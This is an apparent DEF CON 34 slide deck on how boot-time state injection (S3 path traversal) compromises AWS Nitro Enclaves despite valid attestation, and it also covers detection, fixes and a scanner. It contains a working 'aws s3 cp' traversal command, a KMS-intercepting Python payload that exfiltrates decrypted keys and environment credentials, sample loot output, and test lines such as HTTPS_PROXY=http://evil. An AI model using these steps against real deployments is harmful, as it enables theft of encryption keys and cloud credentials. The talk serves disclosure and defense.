---
title: "The Enclave is Lying to You Breaking TEE Trust Boundaries Through Boot-Time State"
speakers: ["Sandeep Jayashankar"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/DEF CON 34 - Sandeep Jayashankar - The Enclave is Lying to You Breaking TEE Trust Boundaries Through Boot-Time State - v2.pptx"
pages: 52
sha256: "f8fef8c2a0f884305f63427a94d22756622938de03044b0778a123aafbc5a722"
text_chars: 24488
ocr_pages: 1
has_ocr: true
redacted_secrets: 1
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:40:21Z"
---
# The Enclave is Lying to You Breaking TEE Trust Boundaries Through Boot-Time State

**Speakers:** Sandeep Jayashankar  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Sandeep Jayashankar - The Enclave is Lying to You Breaking TEE Trust Boundaries Through Boot-Time State - v2.pptx` (52 pages)


## Slide 1

DEF CON 34 · MAIN STAGE

### **The Enclave Is Lying to You**

Breaking TEE Trust Boundaries Through Boot-Time State

Sandeep Jayashankar github.com/pyro-0x

## Slide 2

$ WHOAMI

##### **Sandeep Jayashankar**

Offensive Security & Cloud Adversarial Simulation

15+ years building and breaking cloud-native products and infrastructure Prior work: IAM privilege escalation, container escapes, serverless abuse

Builder of untrust, an open-source TEE deployment scanner

This research: coordinated disclosure complete, fixes shipped

THE ENCLAVE IS LYING TO YOU

INTRO · 02

## Slide 3

IN 8 MINUTES, THIS

attacker C2, exfiltrated from inside the enclave **ATTESTATION: VALID**

- **Rooted, keys stolen, and attestation still reads VALID.**

- No SSH. No host exploit. No bug in the silicon. First, why that's even possible.

THE ENCLAVE IS LYING TO YOU

INTRO · 03

## Slide 4

THE STAKES

**The industry is auditing the hardware. The bugs are in the** Confidential computing is the fastest-growing cloud security primitive , and every dollar of scrutiny goes to **bash scripts.** one side of the stack.

WHAT EVERYONE AUDITS

WHAT NOBODY AUDITS

###### **The silicon**

###### **The deployment layer**

Attestation & PCR measurements Memory encryption Secure boot chain

Formal hardware review, papers, conferences

bootstrap.sh

#  provision runtime, then start enclave setup_networking mount_secrets /run/secrets export LOG_LEVEL=info exec /opt/enclave/run.sh

Millions in R&D. Years of scrutiny.

Copy-pasted from a quickstart. Never reviewed.

THE ENCLAVE IS LYING TO YOU

INTRO · 04

## Slide 5

ACT I 01 / 06 **The** What confidential computing claims, and why the industry believes it. **Promise**

I II III IV V VI

## Slide 6

##### ACT I · THE PROMISE **What does confidential computing promise?** _"A fully compromised host cannot reach into a hardware-isolated enclave."_

, AWS Nitro Enclaves documentation

AWS Nitro Enclaves "Isolated compute to process highly sensitive data"

AMD SEV-SNP "Hardware-enforced memory isolation from the hypervisor"

Intel TDX "Eliminate the need to trust the cloud provider"

Azure Confidential "Data-in-use protection for containerized workloads"

The marketing says the hardware will save you. The hardware is not always the problem.

THE ENCLAVE IS LYING TO YOU

ACT I · 05

## Slide 7

ACT I · THE PROMISE

##### **The TEE Trust Model**

**THE** untrusted · full root **THE** sealed · attested **HOST ENCLAVE** Launches the enclave · controls network + Sealed memory · no SSH / console · attests its code, not its inputs storage · reads every config file **01** UNTRUSTED HOST **02** HARDWARE ISOLATION **03** ENCLAVE INTERIOR **Mechanism Mechanism Mechanism :** IAM + OS hardening **:** PCR attestation + vsock; memory sealed Attestation-bound key release + no-shell **:** Gap: Gap: Gap: Attacker-controlled if CI/CD falls, one write Covers the code , not what's loaded into it Attestation binding is opt-in , most is enough at boot deployments skip it

Boundary 2 holds. Boundaries 1 and 3 are only as good as your config.

THE ENCLAVE IS LYING TO YOU

ACT I · 06

## Slide 8

ACT I · THE PROMISE **Attestation: what it covers**

**PCR0** Enclave image (EIF)

**PCR1 PCR2 PCR8** Linux kernel Application binary Signing certificate

The math is solid. Tamper with the binary → PCRs change → KMS refuses to decrypt. So how did we get root inside, without changing a single PCR value?

THE ENCLAVE IS LYING TO YOU

ACT I · 07

## Slide 9

ACT I · THE PROMISE **Attestation: what it does not cover**

Objects the host fetches and hands in at boot KMS key policy (opt-in, not default) Bootstrap scripts

Any input passed in over vsock (env vars, config) Network bridge configuration

IAM role permissions

The code is correct. The inputs are poisoned.

THE ENCLAVE IS LYING TO YOU

ACT I · 08

## Slide 10

###### ACT I · THE PROMISE

##### **Nobody owns the gap**

Cloud security teams
HARDWARE GUARANTEE BOOT-TIME GAP RUNNING ENCLAVE
"It's hardware-isolated, what
State store Encrypted RAM
could go wrong?"
Sealed memory
env vars Attested code
Hardware / silicon teams Attestation integrity
KMS keys
"We provide attestation, use it."
Isolation
Defends its code , but
Mutable inputs the PCRs never
inherits the unverified
EIF  Cryptographically measured  measure or cover.
inputs it was fed.
author and enforced by the silicon.
"We ship the image, the
operator owns the storage and
IAM."
TRUSTS ITS INPUTS
COVERED BY ATTESTATION OUTSIDE ATTESTATION ANYWAY
The vendor docs
Don't mention any of this.
No attestation. No verification. No protection.

Hardware guarantee vs. deployment reality

THE ENCLAVE IS LYING TO YOU

ACT I · 10

## Slide 11

###### ACT I · THE PROMISE

##### **Who's running TEE workloads? And what's inside?**

**Finance**

Payment processing, HSM-as-a-service

Card data, transaction signing

**100%**

**Crypto / DeFi**

Key custody, wallets

Private keys, signing authority

of these workloads exist specifically to protect the one asset they can't afford to lose.

THE IRONY

**Healthcare**

Genomics, clinical data

**AI / ML**

Model inference, training

PHI / PII at rest and in-use

Model weights, training data

deploy.sh

#  feeds the enclave every boot aws s3 cp s3://state  . -r python launch.py

**Identity** Biometric processing

Fingerprints, face templates

The scripts guarding the crown jewels are usually bash, copied from a quickstart guide.

THE ENCLAVE IS LYING TO YOU

ACT I · 11

## Slide 12

ACT I · THE PROMISE

##### **Three platforms, same pattern**

PLATFORM WHAT'S MEASURED WHAT ESCAPES MEASUREMENT Nitro Enclaves PCR0–8 in attestation doc Input read over vsock at boot SEV-SNP Launch measurement (report) Data loaded after launch TDX MRTD + RTMRs Host / VMM data at runtime **STEP 01** VERIFIED **STEP 02** UNTRUSTE **STEP 03** NOT D COVERED Boot from a hardware-verified Download mutable state from Attestation never covers Step 02 image untrusted storage

###### Not a Nitro problem, a confidential computing deployment problem.

THE ENCLAVE IS LYING TO YOU

ACT I · 12

## Slide 13

ACT II 02 / 06 **The** A real deployment, its boot-time inputs, and where the trust actually **Gap** breaks.

I II

III

IV V VI

## Slide 14

##### ACT II · THE GAP **Architecture of a real TEE deployment**

WHERE THE ATTACK LANDS

**Steps 01 & 02** Attacker-controlled inputs, read from the host and external storage, never attested.

**Step 03** Trusts the poisoned input, the KMS MITM lands here.

The full boot sequence is in the diagram →

THE ENCLAVE IS LYING TO YOU

ACT II · 14

## Slide 15

ACT II · THE GAP **Boot-time inputs: the unattested surface**

|INPUT||SOURCE
AUTHENTICATED?|ATTESTED?|
|---|---|---|---|
||**Env vars**|Host → vsock
NO|NO|
||**S3 state**|Cloud storage
IAM ONLY|NO|
||**KMS key**|Key policy
OPTIONAL|USUALLY NOT|
||**Network**|Host iptables
NO|NO|
||**DNS**|Host DNAT
NO|NO|
|||Five inputs. Zero attestation.||

THE ENCLAVE IS LYING TO YOU

ACT II · 15

## Slide 16

##### ACT II · THE GAP **Who can write to the enclave's state bucket?** s3:PutObject on that one bucket is the entire entry requirement. So, who holds it?

CI/CD service accounts , GitHub Actions, GitLab CI, Jenkins

Deployment automation, Terraform, CloudFormation

Developer IAM users with broad s3:* policies

Third-party integrations, backup, monitoring agents

Or no credentials at all, a misconfigured bucket policy left world-writable

Principals who can write to that bucket in a typical account: dozens to hundreds. The enclave is only as strong as your weakest one.

THE ENCLAVE IS LYING TO YOU

ACT II · 16

## Slide 17

ACT II · THE GAP **Threat model: where we attacked**

Seven boot-time inputs, attacked end to end. **4 3** held let us in

One of those becomes root inside the enclave.

THE ENCLAVE IS LYING TO YOU

ACT II · 17

## Slide 18

ACT II · THE GAP **What was blocked**

BLOCKE D

**Env var injection**

17 payloads, $(cmd), backticks, ; , pipes. Stopped by a 3- layer filter.

**DNS MITM + TLS bypass**

BLOCKE D

iptables DNAT to an attacker IP. Stopped by certificate pinning.

**RPC fuzzing**

STABLE

10,000 random / malformed inputs. No crash, hardened deserialization.

**NTP manipulation** NOT EXPLOITABLE Time skew to expire / replay tokens. Defeated by a hardwarebacked clock.

- **4 / 7 vectors held.** The builder got the hard parts right, input filtering, cert pinning, hardened RPC, and a hardware-backed time source.

THE ENCLAVE IS LYING TO YOU

ACT II · 18

## Slide 19

ACT II · THE GAP **What was exploitable**

**KMS without attestation**

CRITICAL

**IMDS via NAT bridge**

HIGH

Key policy missing RecipientAttestation. Anyone with the IAM role decrypts, no enclave needed.

No iptables filter for 169.254.169.254. Host IAM credentials stolen from inside the enclave.

But what if we could replace a file the enclave imports at boot?

It downloads Python modules from S3 every boot. Overwrite one, and our code runs as root inside the enclave.

THE ENCLAVE IS LYING TO YOU

ACT II · 19

## Slide 20

ACT II · THE GAP

# **../**

###### S3 stores object keys as opaque strings. The filesystem that writes them resolves the path.

attacker@ops, bash

- $ aws s3 cp payload.py "s3://bucket/state/../kms/kms_helper.py"

One command. One IAM permission. Yes, a bug from 1998, and that is the point. **Attestation measured the code. It never looked at the data. Boot-state injection.**

THE ENCLAVE IS LYING TO YOU

ACT II · 20

## Slide 21

ACT III 03 / 06 **The Kill** One IAM permission to root inside the enclave. Eight steps, one command. **Chain**

I II III IV V VI

## Slide 22

ACT III · THE KILL CHAIN **What you're about to see** A real attack chain against a secrets-management service running in a Nitro Enclave.

Entry requirement s3:PutObject, one IAM permission

Host access needed None. No SSH. No SSM. No console.

RESULT **Root + DB encryption key + IAM credentials**

DETECTION **PCR unchanged. No alerts fired.**

As you watch, keep one eye on the attestation status, it never changes.

THE ENCLAVE IS LYING TO YOU

ACT III · 23

## Slide 23

ACT III · THE KILL CHAIN

##### **The kill chain, overview**

RECON TARGET WEAPONIZE **DELIVER** WAIT TRIGGER LOOT PERSIST read config → identify → write payload → s3 cp ../ → next boot → enclave boots → keys + creds → survives module reboot one command

###### Eight boxes. Only one is the actual exploit, DELIVER. The rest is ordinary recon and patience.

Time: minutes Detection: none Attacker effort: 1 command | |

THE ENCLAVE IS LYING TO YOU

ACT III · 24

## Slide 24

##### ACT III · STEP 1 **Reconnaissance**

root@enclave-host, recon

# ls -la /opt/enclave/environment.conf -rw-r--r-- 1 root root 247 Jul  2 09:01 /opt/enclave/environment.conf # cat /opt/enclave/environment.conf BUCKET_NAME=enclave-state-XXXXXXXXXXXX KEY_ARN=arn:aws:kms:us-west-2:XXXXXXXXXXXX:key/XXXXX PAIRING_TOKEN=dummy-already-paired LOG_LEVEL=INFO BUCKET_COSIGNER_DIR=state

Permissions: 644 , world-readable. Any process on the host reads it. Now we know the bucket, the KMS key, and exactly where state lives.

In practice an attacker may not even need host access, bucket names follow predictable conventions, and S3 policies are often over-permissive. THE ENCLAVE IS LYING TO YOU ACT III · 25

## Slide 25

ACT III · STEP 2 **Identify the target module**

s3 state enclave modules

$ aws s3 ls s3://…/ --recursive 4096  state/db.key 32768 state/db/secrets.db 1247  state/config/service.json

# from the EIF manifest /opt/enclave/kms/kms_helper.py ← decrypt /opt/enclave/kms/__init__.py /opt/enclave/app/main.py

Target: kms_helper.py

Imported every time the enclave decrypts a secret. Overwrite it, and our code runs during the next KMS operation.

THE ENCLAVE IS LYING TO YOU

ACT III · 26

## Slide 26

ACT III · STEP 3 **Weaponize**

kms_helper.py, payload

import os, json, boto3def decrypt_string(ciphertext): # MITM: intercept the KMS decrypt, capture, pass through resp = boto3.client("kms").decrypt(CiphertextBlob=ciphertext) plaintext = resp["Plaintext"] _exf i l({"plaintext_hex": plaintext.hex()}) return plaintext   # app continues normally, no crashdef _collect (): # harvest identity, env, encryption keys, credentials return {"id": os.popen("id").read(), "env": dict(os.environ)}

###### Invisible: it intercepts, exfiltrates, and passes through. The app never knows.

THE ENCLAVE IS LYING TO YOU

ACT III · 27

## Slide 27

ACT III · STEP 4

##### **Deliver, one command**

attacker@ops, bash

$  aws s3 cp evil_simple.py \

"s3://enclave-state-XXXX/state/../kms/kms_helper.py"upload:  ./evil_simple.py to s3://enclave-state-XXXX/state/../kms/kms_helper.py

WHERE S3 STORES IT WHERE THE ENCLAVE WRITES IT state/../kms/kms_helper.py /kms/kms_helper.py

That's it. One command. One IAM permission. Hardware isolation from 2024, defeated by a bug pattern older than the enclave itself.

THE ENCLAVE IS LYING TO YOU

ACT III · 28

## Slide 28

THE ENCLAVE IS LYING TO YOU ACT III · 29

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
What S3 sees
$3 stores keys as opaque strings.
No path interpretation.
Bucket: my-enclave-artifacts
Key Size
[=] state/db.key 1.2 KB
=| state/db/secrets.db 64 KB
=) state/ kms/kms_helper. py 11 KB
=| state/checkpoint. json 2.0 KB
[=] state/logs/2025-05-20.log 128 KB
$3 treats the entire string as a literal key.
"../" has no special meaning to S3.
aws s3 sync
What the filesystem does on download
The OS resolves the path during write.
",." moves up one directory.
/opt/enclave/
@ Start at
stated @----------- /opt/enclave/state/
J [EL db. key
Encounter "../"
Go UP one level
-— checkpoint. json
t+— logs/
\ — db/
e :
 kms/ €------------ Then go into
y /opt/enclave/kms/
| kms_helper.py @ |.
‘ @) Write kms_helper.py
— other/ ! OVERWRITTEN!
H— config.yaml a, @ Legitimate file
Ls README.md wr has been replaced.
The filesystem resolves the path.
The write lands OUTSIDE the state/ directory.
$3 stores it literally. The filesystem resolves it.
The file lands OUTSIDE the state directory.
THE ENCLAVE IS LYING TO YOU
ACT Ill - 29
```

## Slide 29

ACT III · STEP 5 **Wait for boot**

The attacker doesn't trigger the boot. They just wait.

Scheduled deployment, most common

Security patch cycle, patching triggers it

Auto-scaling event

Crash recovery

Average time to next boot: < 7 days. The payload sits in S3 indefinitely.

Fleet-wide: every instance booting from this bucket is compromised. Not one box, the source of truth.

THE ENCLAVE IS LYING TO YOU

ACT III · 30

## Slide 30

ACT III · STEP 6

##### **Trigger, the enclave boots**

enclave-service, boot log

- [bootstrap] Downloading state from S3 bucket 'enclave-state-XXXX'…

- [bootstrap]   Downloaded state/db.key

- [bootstrap]   Downloaded state/../kms/kms_helper.py

- [bootstrap]  State download complete. Starting application…

[app] Loading KMS module from /opt/enclave/kms/kms_helper.py

[app] Decrypting database key via KMS… EXFIL_SUCCESS: uploaded to s3://enclave-state-XXXX/exfiltrated/dump.json KMS_MITM_SUCCESS: plaintext key intercepted

[app] Database key loaded. Starting RPC listener on vsock CID 100.

The bootstrap logs show the traversal path being downloaded. No alert fires. The app starts normally. Our code ran. Nobody noticed.

THE ENCLAVE IS LYING TO YOU

ACT III · 31

## Slide 31

ACT III · STEP 7

##### **Loot, what we extracted**

exfiltrated/dump.json { "id" : "uid=0(root) gid=0(root) groups=0(root)" , "hostname": "enclave-i-0a1b2c3d4e5f67890", "env": { "BUCKET_NAME": "enclave-state-XXXXXXXXXXXX", "KEY_ARN": "arn:aws:kms:us-west-2:XXXX:key/XXXXX", "AWS_ACCESS_KEY_ID" : "ASIA[REDACTED:aws-access-key-id]" , "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7…EXAMPLEKEY" , : "AWS_SESSION_TOKEN" "IQoJb3JpZ2luX2VjEBYa…" }, "/tmp/db.key": "a7e3f19b42d8c056e1b4f27a8c3d6e90…" }

Root. Inside the hardware-isolated enclave. With its own IAM credentials, and the database encryption key.

THE ENCLAVE IS LYING TO YOU

ACT III · 32

## Slide 32

ACT III · STEP 7B **The KMS MITM, plaintext key capture**

exfiltrated/kms_mitm.json

- { "attack": "KMS decrypt intercepted inside Nitro Enclave", "plaintext_hex" : "6158627c25e11907234763691b6e9b6d" , "plaintext_length" : 16 ,

"encryption_algorithm": "SYMMETRIC_DEFAULT" }

16 bytes. AES-128. The database encryption key. In plaintext.

The enclave decrypted its own secret, through our code. No error. No crash. No timeout. With this key, the attacker decrypts the secrets database offline, forever.

THE ENCLAVE IS LYING TO YOU

ACT III · 33

## Slide 33

ACT III · STEP 8

##### **Attestation check, the punchline**

enclave, before attack

enclave, after exploit

- $ nitro-cli describe-eif | jq -r .Measurements.PCR0

- 8b3f42a7c1d9e056f3a28d7c4e5b9f10a2c4d6e8f0b1a3c5d7e9f0b

2a4c6d8e0

- $ nitro-cli describe-eif | jq -r .Measurements.PCR0 8b3f42a7c1d9e056f3a28d7c4e5b9f10a2c4d6e8f0b1a3c5d7e9f0b 2a4c6d8e0

PCR0 ATTESTATION: VALID

UNCHANGED

###### We didn't modify the enclave image. We modified what it downloads.

PCR values hash the code, not the data. Attestation says "the binary is correct." It's right. The binary just loaded our module instead of the real one.

THE ENCLAVE IS LYING TO YOU

ACT III · 34

## Slide 34

##### ACT III · THE KILL CHAIN **Same outcome as SolarWinds, none of the effort**

Traditional supply

chain (left)

Eleven steps, months of work, and it still trips a hash mismatch on the way out.

TEE boot poisoning (right)

One aws s3 cp ../ . Same enclave compromise, no hash ever mismatches , because attestation was never measuring this.

THE ENCLAVE IS LYING TO YOU

ACT III · 39

## Slide 35

For a service that guards a master key, the gap between "key theft" and "total compromise" is a few lines of Python.

THE ENCLAVE IS LYING TO YOU ACT III · 36

## Slide 36

ACT III · THE KILL CHAIN

▶ FULL RUN, NO CUTS

THE ENCLAVE IS LYING TO YOU

ACT III · 37

## Slide 37

#### **Pause.**

One IAM permission. One file. A path traversal from 1998.

Attestation: VALID

Enclave state: COMPROMISED Root, keys, credentials: EXFILTRATED

The enclave is still running. Nobody knows.

THE ENCLAVE IS LYING TO YOU

ACT III · 38

## Slide 38

ACT IV 04 / 06 **The** Every step of that attack, and why none of it shows up in your logs. **Silence**

I II III IV V VI

## Slide 39

ACT IV · THE SILENCE **What the attack looks like in CloudTrail**

cloudtrail, event { "eventName": "PutObject", "userIdentity": { "type": "AssumedRole", "arn": "arn:aws:sts::XXXX:assumed-role/ci-deploy-role/session" }, "requestParameters": { "bucketName": "enclave-state-XXXX", : "key" "state/../kms/kms_helper.py" }, "sourceIPAddress": "198.51.100.42" }

One log entry. Looks like a normal deployment artifact upload. No alert fires unless you're specifically looking for ../ in S3 keys.

THE ENCLAVE IS LYING TO YOU

ACT IV · 41

## Slide 40

ACT IV · THE SILENCE

##### **What doesn't get logged**

ATTACKER ACTION CLOUDTRAIL GUARDDUTY EDR / HOST AGENT
control-plane only no behavioral IOC can't see sealed RAM
S3 PutObject with ../ ◐ if data events ✗ ✗
Enclave downloads the file ✗ ✗ ✗
Path traversal resolves ✗ ✗ ✗
Module overwrite inside ✗ sealed ✗ ✗
KMS MITM inside ✗ legit call ✗ ✗
Exfil via S3 PutObject ◐ expected role ✗ ✗

**16/18**<sup>detection cells blind. Once code runs inside sealed memory, no EDR, no strace, no observability. Only the two S3 bookends</sup> leave a trace, and both look like routine deploys.

THE ENCLAVE IS LYING TO YOU

ACT IV · 42

## Slide 41

ACT IV · THE SILENCE **Detection opportunities**

1 · S3 key anomaly

PutObject where key contains ../ or ..\\ → CloudTrail → EventBridge alert

2 · New files in bucket

PutObject to keys not in the expected manifest

3 · S3 data-event trail

Log Get/PutObject keys with ../, catches the download too

- 4 · Enclave IAM anomaly

Role does PutObject to unexpected keys (exfil)

5 · KMS decrypt frequency

Baseline per boot, alert on spikes

THE ENCLAVE IS LYING TO YOU

ACT IV · 43

## Slide 42

ACT V 05 / 06

## **The** What actually closes the gap, and how it was shipped just days later. **Fix**

I II III IV V VI

## Slide 43

ACT V · THE FIX

##### **"But why not just sign the S3 objects?"**

|APPROACH|WORKS?|PROBLEM|
|---|---|---|
|S3 server-side encryption|✗|Anyone with GetObject reads plaintext|
|S3 checksums (SHA256)|~|Catches corruption, not replacement|
|Code-signed manifests|✓|Enclave must carry the verification key in-image|
|Attestation-conditioned KMS|✓|Only the real enclave can decrypt state|

Best answer: encrypt state with a KMS key requiring PCR attestation to decrypt.

The enclave is the only entity that can unwrap the state. Even if S3 is poisoned, the data is useless without the enclave's attestation.

THE ENCLAVE IS LYING TO YOU

ACT V · 45

## Slide 44

ACT V · THE FIX **The fix, shipped days later**

download_state_secure.py

def download_state_secure(bucket, prefx, local_dir): i allowed = load_allowlist("/opt/enclave/expected_fles.txt") i for obj in s3.list_objects_v2(Bucket=bucket, Prefx=pref i x)["Contents"]: i key = obj["Key"] normalized = os.path.normpath(os.path.relpath(key, prefx)) i if ".." in normalized.split(os.sep):   # traversal raise SecurityError(f"Path traversal: {key}") if normalized not in allowed:            # allowlist

SHIPPED BY THE VENDOR OWNED BY THE OPERATOR Hardened download path + attestation-gated KMS, baked into the enclave Lock down bucket IAM, filter IMDS at the bridge, enable versioning + audit. image. Live in a subsequent build. Config outside the image.

THE ENCLAVE IS LYING TO YOU

ACT V · 46

## Slide 45

ACT V · THE FIX

|**The complete fix: 8**

IMAGE-SIDE|
|---|
|**layers**
#
LAYER
CATCHES|
|1
File allowlist
Unknown filenames rejected|
|2
Path normalization
normpath(relpath()) collapses traversals|
|3
Traversal detection
.. in components = reject|
|4
Backslash rejection
Blocks \\ (Windows traversal)|
|5
Absolute path rejection
Blocks /etc/passwd keys|
|6
Null byte rejection
Blocks \\x00 truncation|
|7
Boundary check
realpath() must stay in dir|
|8
No-overwrite
lexists() blocks symlink races|
|Any single layer blocks the attack.Together: comprehensive.|

THE ENCLAVE IS LYING TO YOU

ACT V · 47

## Slide 46

ACT V · THE FIX

##### **KMS policy fix, enforce attestation**

OPERATOROWNED

before, vulnerable after, hardened "Action": "kms:*", { "Resource": "*" "Action": ["kms:Decrypt"], "Condition": { "StringEqualsIgnoreCase": { "kms:RecipientAttestation:PCR0" : "8b3f42a7…", "kms:RecipientAttestation:PCR1" : "52b91975…", "kms:RecipientAttestation:PCR2" : "d14a28d7…" } } }

Now only the exact enclave image can call KMS Decrypt. PCR values come from nitro-cli build-enclave , pin them, update on each release.

THE ENCLAVE IS LYING TO YOU

ACT V · 48

## Slide 47

ACT V · THE FIX **5 checks to run Monday morning**

|#
CHECK|ONE-LINER TEST|
|---|---|
|1
Path traversal|Upload prefix/../../tmp/canary → reboot → does /tmp/canary exist?|
|2
KMS attestation|get-key-policy → grep RecipientAttestation → empty = vulnerable|
|3
IMDS egress|iptables -L FORWARD → grep 169.254.169.254 → no DROP = vulnerable|
|4
Env validation|Set HTTPS_PROXY=http://evil → reboot → does it proxy?|
|5
Audit trail|get-bucket-versioning → not Enabled = blind|
|Or just rununtrust scan,|it checks all five and more ..|

THE ENCLAVE IS LYING TO YOU

ACT V · 49

## Slide 48

ACT V · THE FIX

##### **untrust, open-source TEE scanner**

|bash|||
|---|---|---|
|$pip install untru
--kms-key-id ar|st$untrust scan --target-bucket enclave-state-XXXX \
n:aws:kms:…:key/abc123 --instance-id i-0abc123||
|CHECK|WHAT IT TESTS|SEVERITY|
|BOOTSTRAP-01|../canary upload → path escape?|Critical|
|KMS-01|Key policy has RecipientAttestation?|High|
|NAT-01
ENV-01
AUDIT-01|iptables IMDS drop rule?
Fuzz env delivery with injection payloads
S3 versioning + CloudTrail data events?|Mediu
m
Mediu
m
Low|
|github.com/pyro-0x
THE ENCLAVE IS LYING|/untrust, Nitro today; SEV-SNP and TDX on the roadmap.
TO YOU|ACT V · 50|

## Slide 49

##### ACT V · THE FIX **Responsible disclosure, done right**

FOUN REPORTED FIXED VERIFIED D Identified during an Owning team notified, Hardened build rolled out Every fix re-tested, all issues authorized engagement coordinated disclosure resolved Disclosed responsibly, no live 0-day dropped on stage

This class is fixable, and it was

THE ENCLAVE IS LYING TO YOU

ACT V · 52

## Slide 50

ACT VI 06 / 06 **The** Zoom back out: what really broke, and what everyone should take home. **Lesson**

I II III IV V VI

## Slide 51

ACT VI · THE LESSON

##### **Confidential computing is a deployment problem dressed up as a hardware problem.**

The silicon did its job. Hardware controls still matter, but the code you deploy around the enclave decides more. Attestation covers the code, never the data it trusts: boot-state injection on Nitro, SEV-SNP, TDX alike.

**1 2 3** Your bootstrap script is your security Encrypt state at rest with attestationTreat the host as fully compromised, boundary, treat it like kernel code conditioned KMS, untrusted storage because your threat model says it is becomes irrelevant

THE ENCLAVE IS LYING TO YOU

ACT VI · 54

## Slide 52

**The enclave is lying to you. Find out how.**

$ pip install untrust && untrust scan

One command. Run it tonight.

Sandeep Jayashankar github.com/pyro-0x

###### **Questions?**
